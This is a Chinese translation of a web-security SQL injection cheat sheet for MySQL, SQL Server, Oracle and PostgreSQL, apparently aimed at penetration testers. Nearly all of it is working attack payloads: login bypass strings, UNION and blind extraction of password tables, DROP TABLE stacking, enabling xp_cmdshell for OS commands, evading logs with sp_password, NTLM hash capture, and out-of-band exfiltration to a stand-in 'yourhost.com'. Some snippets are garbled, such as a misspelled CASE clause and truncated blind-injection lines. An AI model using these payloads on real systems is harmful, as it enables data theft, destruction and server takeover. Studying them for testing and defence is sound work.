# 如果有人问你 SQL 注入的资料，请叫他看这份速查表 - 文章 - 伯乐在线
本文由 [伯乐在线](http://blog.jobbole.com) - [疯子船长CasYang](http://www.jobbole.com/members/crhonors) 翻译，[艾凌风](http://www.jobbole.com/members/hanxiaomax) 校稿。未经许可，禁止转载！
英文出处：[Ferruh Mavituna](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)。欢迎加入[翻译组](https://github.com/jobbole/translation-project)。
## 什么是 SQL 注入速查表？
SQL注入速查表是可以为你提供关于不同种类 [SQL注入漏洞](https://www.netsparker.com/web-vulnerability-scanner/vulnerability-security-checks-index/sql-injection/) 的详细信息的一个资源。这份速查表对于经验丰富的渗透测试人员，或者刚开始接触 [Web应用安全](https://www.netsparker.com/web-vulnerability-scanner/vulnerability-security-checks-index/sql-injection/) 的初学者，都是一份很好的参考资料。
## 关于这份 SQL 注入速查表
这份 SQL 速查表最初是 2007 年时 Ferruh Mavituna 在他自己的博客上发布的。我们更新了它并将它移到了公司 CEO 的博客上。现在，这份速查表仅包含了 **MySQL **、**SQL Server**，和有限的一些关于 **Oracle **和 **PostgerSQL **数据库的信息。表中的部分示例可能无法在每一个场景都正常运行，因为真实使用的环境中，可能因为括号的使用、不同的代码上下文以及出乎意料的、奇怪而复杂的 SQL 语句而有所差异。
示例提供给你关于潜在攻击的基本思路，而且几乎每节都包含有简短的说明。
- M：MySQL
- S：SQL Server
- P：PostgreSQL
- O：Oracle
- +：可能出现在其他所有数据库
例如：
- （MS）代表：MySQL 和 SQL Server 等
- （M*S）代表：仅部分版本及有特殊说明的 MySQL，以及 SQLServer
## 目录表
- 语法参考，攻击样例以及注入小技巧
（1）行间注释
- 使用了行间注释的 SQL 注入攻击样例
（2）行内注释
- 经典的行内注释注入攻击样例
- MySQL 版本探测攻击样例
（3）堆叠查询（Stacking Queries）
- 支持堆叠查询的语言/数据库
- 关于 MySQL 和 PHP
- 堆叠注入攻击样例
（4）If 语句
- MySQL 的 If 语句
- SQL Server 的 If 语句
- If 语句的注入攻击样例
（5）使用整数（Integers）
（6）字符串操作
- 字符串的连结
（7）没有引号的字符串
- 基于 16 进制的注入攻击样例
（8）字符串变体 & 相关知识
（9）Union 注入
- UNION — 语言问题处理
（10）绕过登陆界面
（11）在SQL Server 2005 中启用 xp_cmdshell
（12）探测 SQL Server 数据库的结构
（13）从基于错误的 SQL 注入中快速提取数据的方法
（14）SQL 盲注
（15）掩盖痕迹
（16）MySQL 的额外说明
（17）二阶 SQL 注入
（18）带外（OOB）频道攻击
## 语法参考、攻击示例和注入小技巧
### 结束 / 注释掉 / 行注释
#### 行间注释
**注释掉查询语句的其余部分**
行间注释通常用于忽略掉查询语句的其余部分，这样你就不用处理因为注入导致的语法变动。
- — （SM）


```
DROP sampletable;--
```
- # （M）


```
DROP sampletable;#
```
**行间注释的 SQL 注入攻击示例**
- 用户名：admin’–


```
SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
```
这会让你以admin用户身份登录，因为其余部分的SQL语句被注释掉了。
#### 行内注释
**通过不关闭的注释，注释掉查询语句的其余部分**，或者用于**绕过黑名单过滤**、移除空格、迷惑和探测数据库版本。
- /*这里是注释内容*/ （SM）
- DROP/*注释*/sampletable
- DR/**/OP/*绕过过滤*/sampletable
- SELECT/*消除空格*/password/**/FROM/**/Members
- /*! MYSQL 专有 SQL */ （M）
这是 MySQL 的专有语法。非常适合用来探测 MySQL 版本。如果你在注释中写入代码，只有 MySQL 才会执行。你同样可以使用这个方法，让代码只在服务器版本高于指定版本才执行。


```
SELECT /*!32302 1/0, */ 1 FROM tablename
```
**经典的行内注释**** SQL ****注入攻击示例**


```
ID: 10; DROP TABLE members /*
```
在查询结尾简单地去除其他内容。等同于 10; DROP TABLE members —


```
SELECT /*!32302 1/0, */ 1 FROM tablename
```
如果 MySQL 版本高于 23.02 会抛出一个除数为 0（division by 0）的错误
**MySQL ****版本探测攻击示例**


```
ID: /*!32302 10*/
ID: 10
```
如果 MySQL 的版本高于 23.02，执行上面两个查询你将得到相同的结果


```
SELECT /*!32302 1/0, */ 1 FROM tablename
```
如果 MySQL 版本高于 23.02 会抛出一个除数为 0（division by 0）的错误
### 堆叠查询
在一个事务中执行多个查询。这在每一个注入点都非常有用，尤其是后端使用了 SQL Server 的应用程序。
- ; （S）


```
SELECT * FROM members; DROP members--
```
结束一个查询并开始一个新的查询。
#### 语言 / 数据库堆叠查询支持表
**绿色**：支持；**深灰色**：不支持；**浅灰色**：未知
![](http://ww1.sinaimg.cn/large/7cc829d3gw1f86q8k5otmj20do03tq3d.jpg)
#### 关于 MySQL 和 PHP
**阐明一些问题**
**PHP – MySQL ****不支持堆叠查询，**Java 不支持堆叠查询（Oracle 我很确定，其他的就不太确定了）。通常来说 MySQL 支持堆叠查询，但在 PHP – MySQL 应用程序中大多数配置下的数据库层都不能执行第二条查询，也许 MySQL 客户端支持这个，我并不是很确定。有人能说明下吗？
#### 堆叠注入攻击示例
- ID: 10;DROP members —


```
SELECT * FROM products WHERE id = 10; DROP members--
```
这在正常SQL查询执行后将会执行 DROP members 语句。
### If语句
根据If语句得到响应。这是盲注（Blind SQL Injection）的关键点之一，在盲注和精确的简单测试中都非常有用。
**MySQL 的 If 语句**
IF(*condition***,***true-part***,***false-part*)（M）


```
SELECT IF(1=1,'true','false')
```
**SQL Server 的 If 语句**
IF *condition**true-part* ELSE *false-part*（S）


```
IF (1=1) SELECT 'true' ELSE SELECT 'false'
```
**Oracle 的 If 语句**
- BEGIN
IF *condition* THEN *true-part*; ELSE *false-part*; END IF; END;（O）


```
IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;
```
**PostgreSQL 的 If 语句**
- SELECT CASE WHEN *condition* THEN *true-part* ELSE *false-part* END;（P）


```
SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;
```
**If 语句的 SQL 注入攻击示例**


```
if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0 (S)
```
如果当前登录的用户不是 ”sa” 或 “dbo”，语句会抛出 除数为0 的错误。
### 整数的使用
对于绕过非常有用，如 magic_quotes() 和类似的过滤器，甚至是各种WAF。
- 0x*HEXNUMBER*（SM）
你可以这样使用 16 进制数。


```
SELECT CHAR(0x66)（S）
SELECT 0x5045 （这不是一个整数，而会是一个 16 进制字符串）（M）
SELECT 0x50 + 0x45 （现在这个是整数了！）（M）
```
### 字符串操作
字符串相关的操作。这些对于构造不含引号、绕过黑名单或探测后端数据库的注入非常有用。
**字符串的连结**
- + （S）


```
SELECT login + '-' + password FROM members
```
- || （*MO）


```
SELECT login || '-' || password FROM members
```
*** 关于 MySQL 的 “||”**
仅当 MySQL 在 ANSI 模式下这（指 “||” 符号）才会执行，其他模式下 MySQL 会当成 `逻辑运算符` 并返回 0。更好的方式是使用 MySQL 的 CONCAT() 函数。
- CONCAT(str1, str2, str3, …) （M）
连接参数里提供的字符串。


```
SELECT CONCAT(login, password) FROM members
```
### 没有引号的字符串
有一些直接的方式可以使用字符串，但通常更合适的是使用 CHAR() （MS） 和 CONCAT() （M） 来生成无引号的字符串。


```
0x457578 （M） - 字符串的 16 进制表示
SELECT 0x457578
这在 MySQL 中会被当做字符串处理。在 MySQL 中更简单地生成 16 进制字符串的方式是使用下面这个方法：
SELECT CONCAT('0x',HEX('c:boot.ini'))
```


```
在 MySQL 中使用 CONCAT() 函数
SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) （M）
这会返回‘KLM’。
```


```
SELECT CHAR(75)+CHAR(76)+CHAR(77) (S)
这会返回‘KLM’。
```


```
SELECT CHR(75)||CHR(76)||CHR(77) (O)
这会返回‘KLM’。
```


```
SELECT (CHaR(75)||CHaR(76)||CHaR(77)) (P)
这会返回‘KLM’。
```
#### 基于 16 进制的 SQL 注入示例


```
SELECT LOAD_FILE(0x633A5C626F6F742E696E69) （M）
```
这会显示 **c:boot.ini **的内容
### 字符串变体 & 相关知识
- ASCII() （SMP）
返回最左边字符的ASCII码的值。这是盲注的一个必备函数。SELECT ASCII(‘a’)
- CHAR() （SM）
将一个整数转换为对应的ASCII值。SELECT CHAR(64)
### Union注入
通过union你能跨表执行 SQL 查询。 基本上你可以污染（注入）查询使它返回另一个表的记录。


```
SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members
```
这个查询会联结并返回 news 表和 members 表的所有记录。
另一个例子：

MySQL
```
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
```
#### UNION – 语言问题处理
当你使用 Union 注入的时候，有时会遇到错误，因为不同语言的设置（表的设置、字段的设置、表或数据库的联结设置等等），下面这些函数对于解决以上问题很有用。这样的问题比较少见，但当你处理例如日文、俄文、土耳其文或其他类似的应用程序时，你就会发现了。
- SQL Server （S）
使用 COLLATE SQL_Latin1_General_Cp1254_CS_AS 或其他有效的方式 – *具体信息可以查看** SQL Server **的文档。*


```
SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members
```
- MySQL （M）
Hex() 基本上可以解决所有出现的问题。
### 绕过登录界面（SMO+）
**SQL 注入入门指引，登录小技巧**
- admin’ —
- admin’ #
- admin’/*
- ‘ or 1=1–
- ‘ or 1=1#
- ‘ or 1=1/*
- ‘) or ‘1’=’1–
- ‘) or (‘1’=’1–
- ….
- 以不同的用户登录 （SM*）
‘ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–
** **旧版本的** MySQL **不支持** union **查询*
**绕过检查 MD5 哈希的登录界面**
如果应用是先通过用户名获取记录，然后再把返回的 MD5 值与你输入的密码的 MD5 进行比较，那么你就需要一些额外的技巧欺骗应用来绕过验证了。你可以将一个已知明文的 MD5 哈希和它的明文一起提交，这种情况下，应用会比较你的密码和你提供的 MD5 值，而不是从数据库获取的 MD5。
**绕过**** MD5 ****检查的例子**** （MSP）**


```
Username : admin
Password : 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)
```
#### 基于错误 – 探测列名
**使用**** HAVING ****探测列名**** – ****基于错误****（S）**
*顺序不分先后*
- ‘ HAVING 1=1 —
- ‘ GROUP BY **columnfromerror1** HAVING 1=1 —
- ‘ GROUP BY **columnfromerror1, columnfromerror2** HAVING 1=1 —
- ‘ GROUP BY **columnfromerror1, columnfromerror2, columnfromerror(n) **HAVING 1=1 — *and so on*
- 直到不再报错就完成了。
**在**** SELECT ****查询中使用**** ORDER BY ****探测有多少个列（****MSO+）**
通过 ORDER BY 探测列数可以加快 UNION 注入的进度。
- ORDER BY 1–
- ORDER BY 2–
- ORDER BY N– *so on*
- 持续操作直到出现错误，报错时使用的数字就是列数了。
#### 数据类型、UNION 等
**提示：**
- 在使用 UNION 时总是搭配上 ALL，因为会存在相同值的字段，而缺省情况下，Union 都会尝试返回非重复的记录。
- 在查询的开始处，可以使用 -1 或者其他不存在的值来去除左侧表中非必须的记录（前提是注入点在 WHERE 语句里）。如果你一次只想取得一条记录，这是非常关键的点。
- 在对大多数数据类型的 UNION 注入中使用 NULL 代替猜测它是字符串、日期、整数等类型。
- 盲注的情况下，要注意判断错误时来自数据库还是来自应用程序本身。因为像 ASP.NET 或有其他语言，通常在使用 NULL 值的时候会抛出错误（因为开发者们一般没有想过用户名字段会出现 NULL）
#### 获取列类型
- ‘ union select sum(**columntofind**) from **users**— （S）
Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’
[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument.**如果没有返回错误说明字段是数字类型（numeric）**.
- 你也可以使用 CAST() 或者 CONVERT()
- SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL–
- 11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-
没有错误 – 语法是对的。这是 MS SQL Server 的语法。继续。
- 11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-
没有错误 – 第一列是 integer 类型。
- 11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 —
错误！ – 第二列不是 integer 类型。
- 11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-
没有错误 – 第二列是 string 类型。
- 11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-
报错！ – 第三列不是 integer 类型。
- …Microsoft OLE DB Provider for SQL Server error ‘80040e07’
Explicit conversion from data type **int** to image is not allowed.
**你在遇到**** union ****错误之前会遇到**** convert() ****错误！** 所以从 convert() 开始，再用 union。
#### 简单的注入（MSO+）


```
'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*
```
#### 有用的函数 / 信息收集 / 存储过程 / Bulk SQL 注入说明
**@@version**（MS）
数据库的版本和关于 SQL Server 的详细信息。这是个常量，你能把它当做一个列来 select，而且不需要提供表名。同样，你也能在 insert、update 语句或者函数里使用它。


```
INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)
```
**Bulk insert（S）**
（补充说明：bulk insert 是 SQL Server 的一个命令）
插入一个文件的内容到表中。如果你不知道应用的内部路径，可以读取 IIS（仅限 IIS 6）的元数据库文件（metabase file，*%systemroot%system32inetsrvMetaBase.xml*）然后找出应用的路径。
- Create table foo( line varchar(8000) )
- bulk insert foo from ‘c:inetpubwwwrootlogin.asp’
- *Drop **临时表，并重复另一个文件。*
**BCP（S）**
（补充说明：BCP 是 SQL Server 的一个工具）
写文本文件。使用这个功能需要登录。
bcp “SELECT * FROM test..foo” queryout c:inetpubwwwrootruncommand.asp -c -Slocalhost -Usa -Pfoobar
**SQL Server ****中的**** VBS ****和**** WSH（S）**
开启 ActiveX 支持的情况下，你可以在 SQL Server 中使用 VBS 和 WSH 脚本编程。
declare @o int
exec sp_oacreate ‘wscript.shell’, @o out
exec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’
*Username:* ‘; declare @o int exec sp_oacreate ‘wscript.shell’, @o out exec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’ —
**执行系统命令、****xp_cmdshell（S）**
众所周知，在 SQL Server 2005 中默认是禁用的。*你需要** Admin **权限。*.
EXEC master.dbo.xp_cmdshell ‘cmd.exe dir c:’
用 ping 简单检查下 *（在开始之前先配置好你的防火墙或嗅探器确认请求能发出）*
EXEC master.dbo.xp_cmdshell ‘ping ‘
你无法从错误或 union 或其他的什么直接读取结果。
**SQL Server ****中的一些特殊表（****S）**
- Error Messages
.sysmessages
- Linked Servers
.sysservers
- Password *（**2000 **和** 2005 **版本都能被入侵，它们使用非常相似的哈希算法）*
SQL Server 2000:.sysxlogins
SQL Server 2005 : sys.sql_logins
**SQL Server ****的其他存储过程（****S）**
- 命令执行（**xp_cmdshell**）
exec master..xp_cmdshell ‘dir’
- 注册表相关（**xp_regread**）
- xp_regaddmultistring
- xp_regdeletekey
- xp_regdeletevalue
- xp_regenumkeys
- xp_regenumvalues
- xp_regread
- xp_regremovemultistring
- xp_regwrite
exec xp_regread HKEY_LOCAL_MACHINE, ‘SYSTEMCurrentControlSetServiceslanmanserverparameters’, ‘nullsessionshares’
exec xp_regenumvalues HKEY_LOCAL_MACHINE, ‘SYSTEMCurrentControlSetServicessnmpparametersvalidcommunities’
- 管理服务（**xp_servicecontrol**）
- 媒体（**xp_availablemedia**）
- ODBC 资源（**xp_enumdsn**）
- 登录模式（**xp_loginconfig**）
- 创建 Cab 文件（**xp_makecab**）
- 域名列举（**xp_ntsec_enumdomains**）
- 结束进程（*需要进程 **ID*）（**xp_terminate_process**）
- 创建新程序（*实际上你想执行什么都可以了）*
sp_addextendedproc ‘xp_webserver’, ‘c:tempx.dll’
exec xp_webserver
- 将文本文件写进 UNC 或内部路径（sp_makewebtask）
**MSSQL Bulk ****说明**
SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/
DECLARE @result int; EXEC @result = xp_cmdshell ‘dir *.exe’;IF (@result = 0) SELECT 0 ELSE SELECT 1/0
HOST_NAME()
IS_MEMBER (Transact-SQL)
IS_SRVROLEMEMBER (Transact-SQL)
OPENDATASOURCE (Transact-SQL)
INSERT tbl EXEC master..xp_cmdshell OSQL /Q”DBCC SHOWCONTIG”
OPENROWSET (Transact-SQL)  – [http://msdn2.microsoft.com/en-us/library/ms190312.aspx](http://msdn2.microsoft.com/en-us/library/ms190312.aspx)
你不能在 SQL Server 的 Insert 语句里使用子查询。
**使用**** LIMIT（M）****或**** ORDER（MSO）****的注入**


```
SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;
```
如果注入点在 limit 的第二个参数处，你可以把它注释掉或者使用 union 注入。
**停止**** SQL Server（S）**
当你真的不开心了，可以使用 ‘;shutdown —
### 在 SQL Server 中启用 xp_cmdshell
默认情况下，在 SQL Server 2005 中 xp_cmdshell 和其他一些存在潜在危险的存储过程都是被禁用的。如果你有 admin 权限就可以启用它们了。
EXEC sp_configure ‘show advanced options’,1
RECONFIGURE
EXEC sp_configure ‘xp_cmdshell’,1
RECONFIGURE
### 探测 SQL Server 数据库的结构（S）
**获取用户定义表**


```
SELECT name FROM sysobjects WHERE xtype = 'U'
```
**获取字段名**


```
SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')
```
**移动记录（****S）**
- 修改 WHERE 和使用 NOT IN 或 NOT EXIST
… WHERE users NOT IN (‘First User’, ‘Second User’)


```
SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members) -- very good one
```
- 使用恶劣的小技巧


```
SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as intSelect p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21
```
### 从基于错误的 SQL 注入中快速提取数据的方法（S）


```
';BEGIN DECLARE @rt varchar(8000) SET @rd=':' 
SELECT @rd=@rd+' '+name FROM syscolumns 
 WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') 
   AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--
```
**详细说明可以查看文章：**[从基于错误的 SQL 注入中快速提取数据的方法](http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/)
**探测**** MySQL ****数据库的结构（****M）**
**获取用户定义表**


```
SELECT table_name FROM information_schema.tables WHERE table_schema = 'tablename'
```
**获取列名**


```
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'tablename'
```
**探测**** Oracle ****数据库的结构（****O）**
**获取用户定义表**


```
SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'
```
**获取列名**


```
SELECT * FROM all_col_comments WHERE TABLE_NAME = 'TABLE'
```
### SQL 盲注
#### 关于 SQL 盲注
在一个良好的生产环境应用程序中，通常你**无法在页面上看到错误（error）提示**，所以你也就无法通过 Union 攻击或者基于错误的攻击中提取数据。你不得不使用盲注攻击来取得数据。SQL 盲注存在有两种类型：
**一般盲注**：你无法在页面中看到响应，但你仍然可以通过响应或 HTTP 状态码确定查询的结果；
**完全盲注**：无论你怎么注入也无法从输出看出任何变化。这样你只能通过日志记录或类似的来注入。虽然这并不常见。
在一般盲注情况中你可以使用** if 语句**或者 **WHERE 查询来注入**（一般来说很容易），在完全盲注你需要使用一些延时函数并分析响应时间。因此你可以在注入 SQL Server 时使用 **WAIT FOR DELAY ‘0:0:10’**，注入 MySQL 时使用 BENCHMARK() 和 **sleep(10)**，注入 PostgreSQL 时使用 **pg_sleep(10)**，还有对 ORACLE 的一些 PL/SQL 小技巧。
**真实且有点复杂的 SQL 盲注攻击示例**
这些输出来自于一个真实的私有 SQL 盲注工具对使用 SQL Server 的后端程序的攻击和表名遍历。这些请求完成了探测第一个表名的首字符。因为是自动化攻击，SQL 查询比实际需求复杂一些。过程中我们通过二分查找算法尝试确定字符的 ASCII 值。
TRUE 和 FALSE 标记代表查询返回的是 true 或 false。


```
TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103-- 
TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- 
TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- 
TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)
```
当**最后两个查询失败**我们可以毫无疑问地确定表名第一个字符的 **ASCII ****值是**** 80****，这意味着第一个字符是****`P`**。这就是使用二分查找算法进行 SQL 盲注的方法。另一个常见的方法是一位一位（bit）地读取数据。这两个方法在不同情况下都有效。
#### 延时盲注
首先，在完全没有提示（really blind）的情况下才使用，否则使用 1/0 方式的错误辨认差异。其次，使用超过 20 秒的延时需要小心，因为数据库的 API 连接或脚本可能出现超时。
**WAIT FOR DELAY ‘time’（S）**
这个与sleep一样，等待指定的时间。通过 CPU 安全的方法让数据库等待。


```
WAITFOR DELAY '0:0:10'--
```
另外，你也可以使用分数，像这样


```
WAITFOR DELAY '0:0:0.51'
```
**真实案例**
- 是否‘sa’用户？
if (select user) = ‘sa’ waitfor delay ‘0:0:10’
- ProductID = 1;waitfor delay ‘0:0:10’–
- ProductID =1);waitfor delay ‘0:0:10’–
- ProductID =1′;waitfor delay ‘0:0:10’–
- ProductID =1′);waitfor delay ‘0:0:10’–
- ProductID =1));waitfor delay ‘0:0:10’–
- ProductID =1′));waitfor delay ‘0:0:10’–
**BENCHMARK()（M）**
基本上，很多人滥用这个命令来做 MySQL 的延时。小心使用，这会很快地消耗服务器的资源！


```
BENCHMARK(howmanytimes, do this)
```
**真实案例**
- 判断是否 root 用户


```
IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))
```
- 判断表是否存在


```
IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))
```
**pg_sleep(seconds)（P）**
睡眠指定的秒数。


```
SELECT pg_sleep(10);
睡眠 10 秒。
```
**sleep(seconds)（M）**
睡眠指定的秒数。


```
SELECT sleep(10);
睡眠10秒。
```
**dbms_pipe.receive_message（O）**
睡眠指定的秒数。


```
(SELECT CASE WHEN (NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) 
THEN dbms_pipe.receive_message(('xyz'),10) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)
```
**{INJECTION}** = 你想实际运行的查询。
如果条件为真（true），会在10秒后才响应。如果是假（false），延迟1秒就返回。
### 掩盖痕迹
**SQL Server -sp_password ****日志绕过（****S）**
出于安全原因，SQL Server 不会将包含 sp_password 的查询记录到日志中。. 所以如果你在查询中加入 –sp_password 选项，你执行的查询就不会出现在数据库日志中（当然，在 Web 服务器的日志里还是会有，所以可能的话尽量使用 POST 方法）
#### 清晰的 SQL 注入测试
这些测试完全适用于 SQL 盲注和静默攻击。
- asp?id=4（SMO）
- asp?id=5-1
- asp?id=4 OR 1=1
- asp?name=Book
- asp?name=Bo’%2b’ok
- asp?name=Bo’ || ’ok（*OM）*
- asp?name=Book’ OR ‘x’=’x
### MySQL 的额外说明
- 子查询只在 MySQL 4.1 或以上版本才生效
- 用户
- SELECT User,Password FROM mysql.user;
- SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)=’2′,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;
- SELECT … INTO DUMPFILE
- 把查询写入一个新文件（不能修改已有的文件）
- UDF 函数
- create function LockWorkStation returns integer soname ‘user32’;
- select LockWorkStation();
- create function ExitProcess returns integer soname ‘kernel32’;
- select exitprocess();
- SELECT USER();
- SELECT password,USER() FROM mysql.user;
- admin密码哈希值的第一位
- SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;
- 读取文件
- php?user=1+union+select+load_file(0x63…),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
- MySQL Load Data infile
- **这个功能默认是没有开启的！**- create table foo( line blob );
load data infile ‘c:/boot.ini’ into table foo;
select * from foo;
- MySQL 的更多延时方法
- select benchmark( 500000, sha1( ‘test’ ) );
- php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
- select if( user() like ‘root@%’, benchmark(100000,sha1(‘test’)), ‘false’ );
**遍历数据，暴力猜解**- select if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1(‘test’)), ‘false’ );
**潜在有用的**** MySQL ****函数**
- MD5()
MD5 哈希
- SHA1()
SHA1 哈希
- PASSWORD()
- ENCODE()
- COMPRESS()
压缩数据，在 SQL 盲注读取大量二进制数据时很有用。
- ROW_COUNT()
- SCHEMA()
- VERSION()
等同于 @@version
### 二阶 SQL 注入
一般你在某个地方进行 SQL 注入并期望它没有被过滤掉。这是常见的隐藏层问题。


```
Name : ' + (SELECT TOP 1 password FROM users ) + ' 
Email : xx@xx.com
```
如果应用程序在一个不安全的存储过程（或函数、流程等）中使用了 name 字段，那么它会将第一个用户的密码写入到你的 name 字段。
**通过强迫**** SQL Server ****来得到**** NTLM ****哈希**
这个攻击能帮你得到目标服务器上 SQL Server 用户的 Windows 密码，不过你的接入连接可能会被防火墙拦截。这在内部渗透测试中非常有用。我们强迫 SQL Server 连接我们的 Windows UNC 共享（Windows 上常见的网络共享）并通过类似 Cain & Abel（网络嗅探和口令破解工具）的工具捕获 NTLM 会话数据。
**从一个**** UNC ****共享进行**** Bulk insert（S）**


```
bulk insert foo from 'YOURIPADDRESSC$x.txt'
```
查看 Bulk Insert Reference 可以让你了解怎么使用 bulk insert。
### 带外攻击
**SQL Server**
{INJECTION} = 你想要执行的查询。


```
?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECTION})+'.yourhost.com';'sa';'pwd', 'SELECT 1')
将 DNS 解析请求转到 {INJECT}.yourhost.com
```


```
?vulnerableParam=1; DECLARE <a href="http://www.jobbole.com/members/caogen">@q</a> varchar(1024); SET <a href="http://www.jobbole.com/members/caogen">@q</a> = ''+({INJECTION})+'.yourhost.comtest.txt'; EXEC master..xp_dirtree <a href="http://www.jobbole.com/members/caogen">@q</a>
将 DNS 解析请求转到 {INJECTION}.yourhost.com
```
**MySQL**
{INJECTION} = 你想要执行的查询。


```
?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('',({INJECTION}), 'yourhost.com')))
将 NBNS 查询请求或 DNS 解析请求转到 com
```


```
?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE 'yourhost.comshareoutput.txt')
将数据写到你的共享文件夹或文件
```
**Oracle**
{INJECTION} = 你想要执行的查询。


```
?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ sniff.php?sniff='||({INJECTION})||'') FROM DUAL)
嗅探程序将会保存结果
```


```
?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '||({INJECTION})||'.html') FROM DUAL)
结果将会被保存到 HTTP 访问日志
```


```
?vulnerableParam=(SELECT UTL_INADDR.get_host_addr(({INJECTION})||'.yourhost.com') FROM DUAL)
你需要监测去到com 的 DNS 解析请求
```


```
?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(({INJECTION})||’.yourhost.com’,80) FROM DUAL) 
